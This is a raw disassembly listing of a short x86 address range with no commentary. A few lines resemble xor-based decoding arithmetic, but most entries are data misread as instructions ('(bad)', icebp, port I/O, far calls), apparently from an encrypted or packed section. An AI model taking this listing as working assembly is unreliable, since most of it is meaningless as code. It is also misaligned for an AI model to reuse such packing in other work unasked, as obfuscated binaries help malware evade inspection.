  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	ror    DWORD PTR [edi+0x47],0xf5
  405134:	pop    esi
  405135:	push   ebx
  405136:	sub    esi,DWORD PTR [eax+0x70]
  405139:	cmp    eax,0x1b70707d
  40513e:	pop    es
  40513f:	inc    esi
  405140:	test   eax,0xcac27a
  405145:	mov    dh,0x8b
  405147:	lock xor DWORD PTR [ecx-0x68fdc2cd],ecx
  40514e:	stos   DWORD PTR es:[edi],eax
  40514f:	adc    dh,BYTE PTR [eax+esi*1+0x63daeed1]
  405156:	in     eax,dx
  405157:	retf   0xd8c6
  40515a:	mov    WORD PTR [ebp-0xc],ss
  40515d:	xor    dl,dh
  40515f:	js     0x4050fc
  405161:	jmp    DWORD PTR [ebp+ebp*4+0x33]
  405165:	scas   al,BYTE PTR es:[edi]
  405166:	inc    edx
  405167:	(bad)  
  40516a:	push   0xfffdb99b
  40516f:	xor    DWORD PTR [edi-0x20ccc0c4],esp
  405175:	jg     0x40512b
  405177:	retf   
  405178:	popf   
  405179:	mov    esp,0xf0ef83c1
  40517e:	push   ds
  40517f:	cld    
  405180:	sbb    BYTE PTR [edi],al
  405182:	retf   
  405183:	xchg   DWORD PTR [eiz*4-0x4a83b7c],eax
  40518a:	mov    ch,dl
  40518c:	scas   al,BYTE PTR es:[edi]
  40518d:	inc    esp
  40518e:	inc    ebp
  40518f:	cs push eax
  405191:	push   esi
  405192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405193:	mov    ebp,0x3d58f14
  405198:	fwait
  405199:	ret    0x23f3
  40519c:	in     al,0xff
  40519e:	fwait
  40519f:	pop    edx
  4051a0:	push   ds
  4051a1:	cli    
  4051a2:	pop    ss
  4051a3:	aam    0x5e
  4051a5:	jae    0x40513c
  4051a7:	jl     0x40518b
  4051a9:	dec    ebx
  4051aa:	xchg   esi,eax
  4051ab:	in     eax,dx
  4051ac:	aam    0xce
  4051ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051af:	icebp  
  4051b0:	lahf   
  4051b1:	pushf  
  4051b2:	ins    DWORD PTR es:[edi],dx
  4051b3:	rcl    BYTE PTR [edi-0x4b9659f0],1
  4051b9:	fistp  DWORD PTR [eax-0x4a0775fd]
  4051bf:	sub    DWORD PTR [ecx-0x74eceeb3],0x1a
  4051c6:	cs push 0xc0ae5dc2
  4051cc:	mov    bh,0xdf
  4051ce:	fild   WORD PTR [ecx]
  4051d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051d1:	sti    
  4051d2:	rcl    esp,0x7e
  4051d5:	xchg   edx,eax
  4051d6:	call   DWORD PTR [ebx-0x4f324ca7]
  4051dc:	leave  
  4051dd:	xchg   DWORD PTR [ecx],esi
  4051df:	aam    0x33
  4051e1:	add    esp,ebp
  4051e3:	mov    eax,ds:0x42a17535
  4051e8:	mov    eax,ds:0x6ef0182e
  4051ed:	outs   dx,BYTE PTR ds:[esi]
  4051ee:	pop    ecx
  4051ef:	mov    ds:0x9fd9b789,al
  4051f4:	les    edi,FWORD PTR ss:[esi+0x2876424f]
  4051fb:	fdivr  DWORD PTR [edi]
  4051fd:	xchg   ecx,edx
  4051ff:	jle    0x405249
  405201:	add    eax,0xfff6f0ee
  405206:	xor    ecx,DWORD PTR [ebx+ecx*4+0x16]
  40520a:	push   cs
  40520b:	stc    
  40520c:	xchg   DWORD PTR [edx],ebx
  40520e:	inc    ebx
  40520f:	sub    al,0x3b
  405211:	or     al,al
  405213:	imul   eax,DWORD PTR ds:0xf7d03d75,0x62
  40521a:	out    dx,al
  40521b:	ins    BYTE PTR es:[edi],dx
  40521c:	and    al,0x4a
  40521e:	cmovae esp,esp
  405221:	dec    ebp
  405222:	les    ecx,FWORD PTR [eax+0x5e7f4f90]
  405228:	not    DWORD PTR [eax+edi*4-0xa]
  40522c:	sub    eax,0x31b3cefd
  405231:	aas    
  405232:	sbb    ebx,DWORD PTR [eax-0x326e3a3f]
  405238:	sbb    BYTE PTR [esi-0x3f],bl
  40523b:	into   
  40523c:	(bad)  
  40523e:	push   esp
  40523f:	fdivr  DWORD PTR [ebx+0x5f996b93]
  405245:	mov    eax,0xa18e0d7
  40524a:	ss inc edi
  40524c:	mov    al,ds:0x70d44b5b
  405251:	and    DWORD PTR [ebp+0x60],esi
  405254:	repnz aam 0x89
  405257:	mov    fs,edi
  405259:	and    al,0x64
  40525b:	or     ch,bh
  40525d:	ins    BYTE PTR es:[edi],dx
  40525e:	mov    eax,ds:0xdbb7f709
  405263:	iret   
  405264:	mov    edi,0xdd82d5a
  405269:	xchg   DWORD PTR [ecx+0x5e],esi
  40526c:	hlt    
  40526d:	clc    
  40526e:	cmp    BYTE PTR [ebx],al
  405270:	loop   0x405248
  405272:	mov    ?,WORD PTR ds:0xda566724
  405278:	(bad)  
  405279:	in     eax,0xb6
  40527b:	pop    edi
  40527c:	xchg   DWORD PTR [edx-0x5cf180dd],eax
  405282:	in     eax,dx
  405283:	js     0x283f59a4
  405289:	dec    ebp
  40528a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40528b:	push   esi
  40528c:	sbb    dh,dl
  40528e:	loope  0x40521a
  405290:	mov    ds:0x4f6085e6,al
  405295:	call   0x31e6ea6a
  40529a:	mov    dh,BYTE PTR [edx]
  40529c:	repz and ah,BYTE PTR [esi+0x24]
  4052a0:	sbb    ah,al
  4052a2:	rcl    WORD PTR [esi],cl
  4052a5:	test   bl,0x5
  4052a8:	retf   
  4052a9:	sub    BYTE PTR [edx-0x32c2b005],cl
  4052af:	xchg   DWORD PTR ds:0x8c350742,esi
  4052b5:	push   ds
  4052b6:	(bad)  
  4052b7:	dec    ebp
  4052b8:	lds    edx,FWORD PTR [edx+0x5d]
  4052bb:	leave  
  4052bc:	scas   al,BYTE PTR es:[edi]
  4052bd:	shl    ebp,0x18
  4052c0:	popa   
  4052c1:	cwde   
  4052c2:	pop    edx
  4052c3:	(bad)
  4052c6:	and    ebx,esi
  4052c8:	fsubr  QWORD PTR [edx+ebx*8]
  4052cb:	xchg   ebx,eax
  4052cc:	xor    eax,0xf153bf5e
  4052d1:	fs mov bh,0xd4
  4052d4:	popf   
  4052d5:	cmp    eax,0xce13aceb
  4052da:	mov    ebx,esi
  4052dc:	xchg   DWORD PTR fs:[ecx+eiz*4],ecx
  4052e0:	ret    
  4052e1:	jl     0x4052c7
  4052e3:	lahf   
  4052e4:	jb     0x4052d6
  4052e6:	sahf   
  4052e7:	dec    ebx
  4052e8:	mov    ecx,0x95749b8e
  4052ed:	sub    esi,ebp
  4052ef:	pushf  
  4052f0:	jle    0x405330
  4052f2:	push   0x9eacb1e9
  4052f7:	int3   
  4052f8:	add    eax,0xaef834fa
  4052fd:	or     ecx,DWORD PTR [eax-0x1f56eeb6]
  405303:	pop    esi
  405304:	fsubr  QWORD PTR [esi-0x5b]
  405307:	mov    dh,0xf4
  405309:	add    bh,BYTE PTR [ecx]
  40530b:	pop    eax
  40530c:	and    bl,BYTE PTR [eax]
  40530e:	mov    al,ds:0x64280bad
  405313:	bound  edx,QWORD PTR [ebx-0x57]
  405316:	mov    BYTE PTR [esi],bh
  405318:	dec    edx
  405319:	cwde   
  40531a:	and    DWORD PTR [ecx],0x3ba74de8
  405320:	and    DWORD PTR [esi-0x760e91a6],esi
  405326:	lds    edi,FWORD PTR [ecx]
  405328:	dec    ebx
  405329:	scas   eax,DWORD PTR es:[edi]
  40532a:	sbb    BYTE PTR fs:[ebx+ebp*1],bh
  40532e:	or     DWORD PTR [esi+0x31],eax
  405331:	leave  
  405332:	sub    ah,BYTE PTR [esi+0x30]
  405335:	lea    edx,[eax+0x4d6829e2]
  40533b:	cmc    
  40533c:	pop    es
  40533d:	jecxz  0x4052df
  40533f:	pop    ss
  405340:	fst    DWORD PTR [esi]
  405342:	clc    
  405343:	push   esp
  405344:	lds    ecx,FWORD PTR [edi]
  405346:	call   0xbf0d84dd
  40534b:	xchg   DWORD PTR [edi],edx
  40534d:	out    0x34,eax
  40534f:	push   edi
  405350:	pop    ebx
  405351:	fwait
  405352:	ret    
  405353:	xchg   ebp,eax
  405354:	cmp    ecx,0x4a60f994
  40535a:	arpl   WORD PTR [edi],cx
  40535c:	sbb    esi,DWORD PTR [ebx]
  40535e:	dec    edx
  40535f:	enter  0xe679,0xc0
  405363:	cmp    ah,BYTE PTR [edi-0x7b]
  405366:	dec    ebx
  405367:	pop    ss
  405368:	mov    esi,0xe0e4f729
  40536d:	xor    esp,DWORD PTR [eax-0x59c747fb]
  405373:	es mov dh,0x98
  405376:	leave  
  405377:	outs   dx,BYTE PTR ds:[esi]
  405378:	sub    eax,0x605d5171
  40537d:	sbb    BYTE PTR [ebx-0x28],0xc5
  405381:	shr    ch,1
  405383:	xor    edx,DWORD PTR [edx]
  405385:	lahf   
  405386:	or     BYTE PTR [ecx+0x2b7b193e],dl
  40538c:	fild   DWORD PTR [ebx+ebx*2-0x2]
  405390:	adc    WORD PTR [ebx+0x5844bad3],cx
  405397:	shl    ebp,cl
  405399:	fistp  QWORD PTR [edi+0x1a3e1136]
  40539f:	push   ss
  4053a0:	out    dx,eax
  4053a1:	loope  0x4053a5
  4053a3:	sub    al,0xd4
  4053a5:	push   ds
  4053a6:	out    0x56,eax
  4053a8:	xchg   esi,eax
  4053a9:	or     bl,BYTE PTR ds:0xbc1f2909
  4053af:	(bad)  
  4053b0:	out    dx,al
  4053b1:	jo     0x405334
  4053b3:	pop    ss
  4053b4:	not    BYTE PTR [ebx+ebx*1]
  4053b7:	xor    DWORD PTR [ebx-0xd7a72db],esp
  4053bd:	(bad)  
  4053be:	mov    bl,0x8d
  4053c0:	mov    dl,0x84
  4053c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053c3:	pop    ss
  4053c4:	outs   dx,DWORD PTR ds:[esi]
  4053c5:	rcl    edi,cl
  4053c7:	out    0xcd,al
  4053c9:	(bad)  
  4053cb:	mov    ds:0x6a6785a1,al
  4053d0:	cmp    eax,0xbf3fd6d
  4053d5:	fs cmc 
  4053d7:	and    DWORD PTR [edx+ebp*8-0x3ccc66d0],esp
  4053de:	mov    ecx,0x98bc0de0
  4053e3:	stc    
  4053e4:	fwait
  4053e5:	mov    gs,WORD PTR [ecx]
  4053e7:	or     edi,edi
  4053e9:	es push esi
  4053eb:	call   0xf22a:0xa929cfe2
  4053f2:	leave  
  4053f3:	pushf  
  4053f4:	or     ecx,edx
  4053f6:	xor    BYTE PTR [esi+ebp*8+0xcf2ac4e],ah
  4053fd:	mov    ebp,edx
  4053ff:	mov    BYTE PTR [ebp-0x57a8228c],ah
  405405:	je     0x4053e9
  405407:	adc    al,0x1
  405409:	pop    ecx
  40540a:	je     0x405430
  40540c:	mov    ebx,0x9d3744ff
  405411:	sub    eax,0x1b1b1434
  405416:	cmp    DWORD PTR [ecx+0x22],0x68
  40541a:	aad    0x3e
  40541c:	adc    al,0x33
  40541e:	ret    
  40541f:	xchg   DWORD PTR [ebx+0x21],esi
  405422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405423:	in     eax,0xef
  405425:	adc    esp,DWORD PTR [ebp-0x8]
  405428:	pop    esi
  405429:	mov    dh,ah
  40542b:	ficom  WORD PTR [edi-0x3d760d3f]
  405431:	call   0x423c:0xd24e522c
  405438:	aad    0x57
  40543a:	xor    eax,0x800554ff
  40543f:	test   al,0xb1
  405441:	pop    ss
  405442:	shl    BYTE PTR [edx-0x6],0x99
  405446:	push   ebp
  405447:	stos   BYTE PTR es:[edi],al
  405448:	scas   al,BYTE PTR es:[edi]
  405449:	and    dh,ch
  40544b:	rcr    BYTE PTR [eax],0x5
  40544e:	ja     0x4054bb
  405450:	in     eax,0x5c
  405452:	in     eax,0x53
  405454:	or     BYTE PTR [esi],0xed
  405457:	ficom  WORD PTR [ebx+0x106b1916]
  40545d:	pushf  
  40545e:	rcr    BYTE PTR ds:0xa6e385d8,cl
  405464:	loop   0x40545b
  405466:	push   0xfffffffa
  405468:	js     0x405485
  40546a:	sub    ch,ch
  40546c:	(bad)  
  40546d:	jmp    0x5a62b1bb
  405472:	sbb    DWORD PTR [edx-0x14],esi
  405475:	fild   DWORD PTR [esi-0x748236ff]
  40547b:	pop    ss
  40547c:	add    al,0xf6
  40547e:	(bad)  
  40547f:	jg     0x4054df
  405481:	leave  
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e884
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e7eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	inc    esi
  4054a9:	aam    0xea
  4054ab:	sub    al,0x10
  4054ad:	aaa    
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x4054d3
  4054b5:	ss cmp ebp,esi
  4054b8:	and    BYTE PTR [ebx-0x3304d76e],dl
  4054be:	mov    cl,0x0
  4054c0:	ret    0x791c
  4054c3:	lahf   
  4054c4:	pop    ss
  4054c5:	jecxz  0x4054f3
  4054c7:	dec    esi
  4054c8:	push   ds
  4054c9:	xchg   esp,eax
  4054ca:	std    
  4054cb:	jp     0x4054d6
  4054cd:	aad    0xc0
  4054cf:	mov    bh,0x2f
  4054d1:	into   
  4054d2:	dec    esi
  4054d3:	lock retf 0x32a7
  4054d7:	ss in  al,dx
  4054d9:	sbb    al,0x5f
  4054db:	push   edx
  4054dc:	add    BYTE PTR [esi],0x1b
  4054df:	pop    es
  4054e0:	jae    0x405531
  4054e2:	adc    bl,0xc9
  4054e5:	nop
  4054e6:	repnz mov BYTE PTR [eax],dl
  4054e9:	cmp    edi,DWORD PTR [esi+eiz*4-0x5]
  4054ed:	inc    edx
  4054ee:	inc    edi
  4054ef:	in     al,dx
  4054f0:	jns    0x405479
  4054f2:	pop    edx
  4054f3:	cmp    eax,0x9ff90289
  4054f8:	test   WORD PTR [esi-0x5bcdc4c1],cx
  4054ff:	lahf   
  405500:	or     dh,cl
  405502:	push   edi
  405503:	loopne 0x40548a
  405505:	call   0x23d7:0x15f5b5d8
  40550c:	dec    edi
  40550d:	enter  0x6d2,0xfa
  405511:	add    DWORD PTR [esi+0x1f74fdbd],ebp
  405517:	repz aad 0xa
  40551a:	je     0x40557a
  40551c:	xor    BYTE PTR [edi+edx*4-0x9],0x5
  405521:	in     al,0x7b
  405523:	xchg   esi,eax
  405524:	sbb    BYTE PTR [esi+0x28940742],0xa6
  40552b:	mov    BYTE PTR [edx],0xa9
  40552e:	jns    0x4054c7
  405530:	(bad)  
  405531:	outs   dx,DWORD PTR ds:[esi]
  405532:	jp     0x405536
  405534:	mov    esp,0x7a87b2b9
  405539:	dec    ebp
  40553a:	xchg   ebp,eax
  40553b:	ins    BYTE PTR es:[edi],dx
  40553c:	mov    bh,BYTE PTR [eax]
  40553e:	mov    ecx,0x545737e3
  405543:	fcomp  DWORD PTR [edx+0x1402f855]
  405549:	or     esp,esi
  40554b:	sti    
  40554c:	outs   dx,BYTE PTR ds:[esi]
  40554d:	push   esp
  40554e:	les    esi,FWORD PTR [ecx-0x2e]
  405551:	xor    BYTE PTR [edx-0x200d3dbf],dh
  405557:	dec    esp
  405558:	dec    esp
  405559:	adc    eax,0x63941876
  40555e:	lods   al,BYTE PTR ds:[esi]
  40555f:	pop    ss
  405560:	std    
  405561:	fst    QWORD PTR [ecx-0x61102793]
  405567:	mov    al,ds:0xa89188d
  40556c:	pop    ebp
  40556d:	iret   
  40556e:	pop    ss
  40556f:	fs adc eax,0xf8954cf1
  405575:	mov    esi,DWORD PTR [ebp-0x705d0cd3]
  40557b:	pop    esp
  40557c:	sbb    BYTE PTR [edx],dl
  40557e:	xchg   ebp,eax
  40557f:	jns    0x405571
  405581:	ds xchg esp,eax
  405583:	sub    al,0x96
  405585:	pop    es
  405586:	push   es
  405587:	js     0x405571
  405589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40558a:	push   ecx
  40558b:	mov    WORD PTR [eax],cs
  40558d:	loopne 0x4055a2
  40558f:	call   0x3fc1:0xafa740dd
  405596:	fs es adc ch,cl
  40559a:	push   es
  40559b:	das    
  40559c:	mov    bl,0x20
  40559e:	jnp    0x405538
  4055a0:	int    0x70
  4055a2:	mov    ecx,0xd8499e60
  4055a7:	std    
  4055a8:	pop    ds
  4055a9:	add    esp,esp
  4055ab:	inc    eax
  4055ad:	ins    BYTE PTR es:[edi],dx
  4055ae:	mov    esi,0x60492ab3
  4055b3:	add    ebp,ebp
  4055b5:	jne    0x4055c5
  4055b7:	mov    bl,0x9a
  4055b9:	out    dx,al
  4055ba:	pushf  
  4055bb:	pop    esp
  4055bc:	idiv   BYTE PTR [ebx+eiz*8-0xc13a2cb]
  4055c3:	jp     0x4055e6
  4055c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055c6:	push   0x52b1c5fa
  4055cb:	fistp  DWORD PTR [esi]
  4055cd:	push   0x5
  4055cf:	and    BYTE PTR [eax-0x78726779],bl
  4055d5:	push   cs
  4055d6:	mov    ds:0x792a2975,al
  4055db:	jmp    0x4055d6
  4055dd:	push   esp
  4055de:	rcl    BYTE PTR [ebx],1
  4055e0:	scas   al,BYTE PTR es:[edi]
  4055e1:	or     DWORD PTR [ebp-0x2377a0da],0x50ea054f
  4055eb:	ins    BYTE PTR es:[edi],dx
  4055ec:	jno    0x4055e3
  4055ee:	xor    esi,DWORD PTR [esi+0x1119b65]
  4055f4:	push   ss
  4055f5:	inc    ecx
  4055f6:	std    
  4055f7:	jb     0x40564c
  4055f9:	out    0x0,al
  4055fb:	jbe    0x4055e1
  4055fd:	push   ds
  4055fe:	sbb    eax,0x44b0031c
  405603:	mov    bl,0x6b
  405605:	test   BYTE PTR [esi+eiz*1-0x44],al
  405609:	in     al,dx
  40560a:	call   0x41d875fc
  40560f:	loop   0x40566f
  405611:	repnz (bad) 
  405613:	push   ebx
  405614:	pop    es
  405615:	cmp    eax,0xc3782919
  40561a:	mov    ds:0x44fc11fe,eax
  40561f:	int3   
  405620:	jbe    0x405629
  405622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405623:	into   
  405624:	jg     0x4055a8
  405626:	inc    edx
  405627:	call   ebx
  405629:	call   0x5752:0x8b32a782
  405630:	gs dec edi
  405632:	loopne 0x405628
  405634:	sub    BYTE PTR [edi],cl
  405636:	test   bh,ch
  405638:	jmp    0xbde9071a
  40563d:	sbb    eax,0x3487d97f
  405642:	xor    DWORD PTR [ecx],eax
  405644:	jl     0x405647
  405646:	or     DWORD PTR [edx+0x63],edi
  405649:	nop
  40564a:	in     eax,dx
  40564b:	dec    ebx
  40564c:	popa   
  40564d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40564e:	mov    WORD PTR [ebp+ecx*4-0x5d],es
  405652:	pop    edi
  405653:	(bad)  
  405654:	cs inc eax
  405656:	in     eax,0xc7
  405658:	add    BYTE PTR [ecx-0x5f13e7],0x50
  40565f:	add    DWORD PTR [ebx],0xffffffa2
  405662:	pop    ebp
  405663:	and    ch,bh
  405665:	ficomp WORD PTR [ecx-0x7f]
  405668:	repz sub edi,DWORD PTR [edi+esi*4]
  40566c:	out    0xbf,al
  40566e:	mov    dh,0x47
  405670:	xchg   ebx,eax
  405671:	push   ebx
  405672:	adc    sp,WORD PTR [ebx-0x4cbef4a]
  405679:	xor    al,0xfd
  40567b:	dec    edx
  40567c:	jae    0x40561f
  40567e:	stc    
  40567f:	ret    
  405680:	rcr    BYTE PTR [esi],1
  405682:	pusha  
  405683:	ret    0xc6d7
  405686:	in     al,dx
  405687:	loopne 0x405675
  405689:	adc    edx,esi
  40568b:	and    bl,BYTE PTR [eax+0x10]
  40568e:	scas   al,BYTE PTR es:[edi]
  40568f:	imul   edi,DWORD PTR [ebp+0x6ccad564],0x1205dbe6
  405699:	adc    edx,DWORD PTR [ecx+0x4da52a57]
  40569f:	inc    ebp
  4056a0:	dec    edx
  4056a1:	shl    esp,0x76
  4056a4:	aaa    
  4056a5:	jno    0x405663
  4056a7:	push   eax
  4056a8:	xor    ch,BYTE PTR [eax-0x22]
  4056ab:	sbb    al,0xd
  4056ad:	mov    WORD PTR [eax],ss
  4056af:	jmp    0x3579:0x7445c4d8
  4056b6:	outs   dx,DWORD PTR ds:[esi]
  4056b7:	inc    esp
  4056b8:	js     0x405715
  4056ba:	push   ebx
  4056bb:	pop    ecx
  4056bc:	pop    esi
  4056bd:	je     0x4056e1
  4056bf:	(bad)  
  4056c0:	add    al,0x79
  4056c2:	and    ebp,ebp
  4056c4:	or     al,BYTE PTR [edx-0x35]
  4056c7:	cdq    
  4056c8:	cmp    al,0x7
  4056ca:	xor    esi,DWORD PTR [esi-0x3d]
  4056cd:	push   cs
  4056ce:	das    
  4056cf:	push   es
  4056d0:	into   
  4056d1:	jno    0x405675
  4056d3:	test   BYTE PTR [eax-0xb],bl
  4056d6:	jne    0x4056ed
  4056d8:	mov    ch,0xf7
  4056da:	push   0x58ff743d
  4056df:	test   DWORD PTR [ebp+0xd],eax
  4056e2:	mov    dh,0xfd
  4056e4:	pop    ecx
  4056e5:	int    0x9d
  4056e7:	mov    ds:0x6bb875d,al
  4056ec:	xchg   ecx,eax
  4056ed:	cmp    eax,DWORD PTR [edi+eiz*2]
  4056f0:	inc    edi
  4056f1:	push   eax
  4056f2:	cdq    
  4056f3:	push   es
  4056f4:	push   ecx
  4056f5:	pop    ss
  4056f6:	or     DWORD PTR [ebx],ecx
  4056f8:	hlt    
  4056f9:	scas   al,BYTE PTR es:[edi]
  4056fa:	out    dx,eax
  4056fb:	scas   eax,DWORD PTR es:[edi]
  4056fc:	add    ah,dh
  4056fe:	mov    bh,0x43
  405700:	(bad)  
  405702:	pop    ds
  405703:	xchg   ebx,eax
  405704:	dec    ebx
  405705:	xor    ecx,DWORD PTR [edx+ecx*4-0x37]
  405709:	xor    cl,0x94
  40570c:	mov    esp,0x11ecc037
  405711:	sub    ch,cl
  405713:	into   
  405714:	lock bswap esp
  405717:	cmp    BYTE PTR [ebx+0x4f],cl
  40571a:	outs   dx,BYTE PTR ds:[esi]
  40571c:	aam    0xf6
  40571e:	rol    ch,cl
  405720:	push   0x42
  405722:	pop    edx
  405723:	fmulp  st(4),st
  405725:	jge    0x4057a1
  405727:	sub    al,0x74
  405729:	clc    
  40572a:	mov    edx,0xc197d502
  40572f:	push   ebx
  405730:	xchg   ebp,eax
  405731:	daa    
  405732:	fstp   DWORD PTR [esi]
  405734:	and    eax,0x7cd2b112
  405739:	retf   
  40573a:	add    eax,0xf51258f
  40573f:	ss mov edx,0xf3df73f0
  405745:	adc    DWORD PTR [ecx-0x3c],ebx
  405748:	test   DWORD PTR [esp+ebx*4-0x715b6697],eax
  40574f:	dec    ebp
  405750:	sbb    al,0x4b
  405752:	sar    BYTE PTR [ebx-0x58],0x9f
  405756:	adc    BYTE PTR ds:0xbc55dd57,al
  40575c:	inc    edi
  40575d:	xchg   esi,eax
  40575e:	cmp    ch,BYTE PTR [edi+0x65]
  405761:	popf   
  405762:	addr16 pusha 
  405764:	mov    ds:0xd7866e38,al
  405769:	je     0x4057bc
  40576b:	movzx  eax,WORD PTR ds:0x42fe86
  405772:	and    eax,DWORD PTR ds:0x42fe7a
  405778:	mov    ds:0x42fe86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx+0x67ad91be],eax
  405790:	aas    
  405791:	push   0x4a
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	gs loopne 0x405756
  40579d:	and    BYTE PTR [esi+0x69],0x7b
  4057a1:	outs   dx,DWORD PTR ds:[esi]
  4057a2:	sbb    eax,0x73f00a63
  4057a7:	mov    ds:0xe5459c3e,eax
  4057ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057ad:	aam    0x99
  4057af:	clc    
  4057b0:	fs cmp eax,0x5e4f9d38
  4057b6:	mov    al,0xca
  4057b8:	js     0x405780
  4057ba:	mov    al,ds:0x88d74be8
  4057bf:	das    
  4057c0:	xchg   ebx,eax
  4057c1:	das    
  4057c2:	ficom  DWORD PTR [ebx+eax*1-0x3e]
  4057c6:	std    
  4057c7:	dec    esp
  4057c8:	or     BYTE PTR [ebx-0x24cc83e1],ah
  4057ce:	out    dx,al
  4057cf:	push   esp
  4057d0:	test   al,0x7e
  4057d2:	mov    ebp,0xb1e5f3c2
  4057d7:	ins    BYTE PTR es:[edi],dx
  4057d8:	popa   
  4057d9:	sub    DWORD PTR [ebp+0x37eae9d8],ebp
  4057df:	sub    DWORD PTR [ebx-0x11],0xab108cfe
  4057e6:	sbb    DWORD PTR [esi],edx
  4057e8:	pop    esp
  4057e9:	pop    es
  4057ea:	sti    
  4057eb:	cdq    
  4057ec:	bound  eax,QWORD PTR [ebx]
  4057ee:	cmp    DWORD PTR [ebp-0x6d53372b],esi
  4057f4:	gs inc eax
  4057f6:	fwait
  4057f7:	sbb    ch,BYTE PTR [ebp+0x2]
  4057fa:	jb     0x40583b
  4057fc:	mov    eax,0x6da31673
  405801:	xor    eax,0x4cd40b1c
  405806:	add    eax,0xfc4a372a
  40580b:	cdq    
  40580c:	mov    dl,0xdd
  40580e:	push   0x236e3c35
  405813:	ret    0x20b
  405816:	add    BYTE PTR [eax],ch
  405818:	fwait
  405819:	mov    esi,0xbfebb8b9
  40581e:	adc    BYTE PTR [esi],cl
  405820:	fild   QWORD PTR [ecx+0x40771c02]
  405826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405827:	fwait
  405828:	and    al,0xbe
  40582a:	(bad)  
  40582b:	or     cl,BYTE PTR ds:0x3859a6be
  405831:	jbe    0x405831
  405833:	adc    esp,ebp
  405835:	(bad)  
  405836:	jbe    0x40585f
  405838:	retf   
  405839:	pushf  
  40583a:	aam    0xa6
  40583c:	inc    edx
  40583d:	jno    0x405837
  40583f:	ret    0x8fd9
  405842:	je     0x4057cb
  405844:	mov    edi,0x1b9e183a
  405849:	push   0xffffff94
  40584b:	adc    BYTE PTR [ecx-0x31a6df83],0xea
  405852:	sub    al,0x68
  405854:	leave  
  405855:	int    0x5e
  405857:	cmp    edx,DWORD PTR [ecx-0x32]
  40585a:	mov    ?,WORD PTR [ecx]
  40585c:	mov    ebp,0xb2aee9fd
  405861:	fld    QWORD PTR [esi-0x19]
  405864:	mov    al,0xee
  405866:	pusha  
  405867:	xor    eax,0xcabf13ad
  40586c:	mov    edi,0xdcff4341
  405871:	int3   
  405872:	xor    BYTE PTR [edx+0x44abbdd8],0xc3
  405879:	jb     0x4058e4
  40587b:	cdq    
  40587c:	hlt    
  40587d:	push   ebx
  40587e:	data16 scas al,BYTE PTR es:[edi]
  405880:	adc    bl,cl
  405882:	adc    bh,cl
  405884:	retf   
  405885:	xor    ecx,DWORD PTR [edx+0x34]
  405888:	xor    bl,BYTE PTR [esi]
  40588a:	sub    esi,ebx
  40588c:	adc    cl,BYTE PTR [ebp+0x2e2be4de]
  405892:	aad    0x11
  405894:	mov    bl,0x68
  405896:	cli    
  405897:	inc    esp
  405898:	test   eax,0xa65f843c
  40589d:	ficomp DWORD PTR [edx]
  40589f:	dec    edi
  4058a0:	repz lock or dl,BYTE PTR [esi+0x59]
  4058a5:	lods   eax,DWORD PTR ds:[esi]
  4058a6:	and    edi,edx
  4058a8:	jae    0x40583e
  4058aa:	repz test BYTE PTR [ebx+0x55918c8f],dl
  4058b1:	popf   
  4058b2:	pop    edi
  4058b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058b4:	add    eax,0x5ddb08f0
  4058b9:	inc    ecx
  4058ba:	fdiv   DWORD PTR [ebx-0xe]
  4058bd:	mov    ebp,?
  4058bf:	xchg   edi,eax
  4058c0:	mov    esp,0x63883055
  4058c5:	adc    bl,BYTE PTR [esi]
  4058c7:	(bad)  
  4058c8:	ja     0x4058b3
  4058ca:	sahf   
  4058cb:	xchg   BYTE PTR [ebp+0x2e3db71],bl
  4058d1:	xor    al,0x3c
  4058d3:	(bad)  
  4058d4:	icebp  
  4058d5:	pop    ecx
  4058d6:	jno    0x4058da
  4058d8:	mov    ch,0xe7
  4058da:	pop    ecx
  4058db:	js     0x4058bb
  4058dd:	inc    esp
  4058de:	inc    edi
  4058df:	push   ds
  4058e0:	dec    esp
  4058e1:	shr    DWORD PTR [ebx+0x64],cl
  4058e4:	lds    esi,FWORD PTR [esp+eax*4+0x7596c7c]
  4058eb:	add    edx,eax
  4058ed:	mov    DWORD PTR [edx],ecx
